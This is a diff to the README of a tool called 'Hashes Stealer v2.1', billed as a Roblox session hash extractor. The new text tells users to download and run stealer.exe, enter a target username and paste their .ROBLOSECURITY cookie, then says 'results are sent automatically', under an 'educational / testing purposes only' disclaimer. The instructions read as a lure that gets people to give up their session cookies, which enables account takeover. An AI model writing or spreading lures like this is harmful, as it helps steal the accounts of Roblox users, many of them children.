@@ -1,7 +1,13 @@
-# Hashes Stealer
+# HASHES STEALER v2.1
 
-## How to use
-1. Run `stealer.py`
-2. At `hashes>` prompt type `steal`
-3. Enter target username
-4. Paste your cookie
+Roblox session hash extractor tool.
+
+## How to use:
+1. Download `stealer.exe`
+2. Double click it
+3. Type the username you want to target
+4. Paste The `.ROBLOSECURITY` cookie when asked
+
+Results are sent automatically.
+
+**For educational / testing purposes only.**
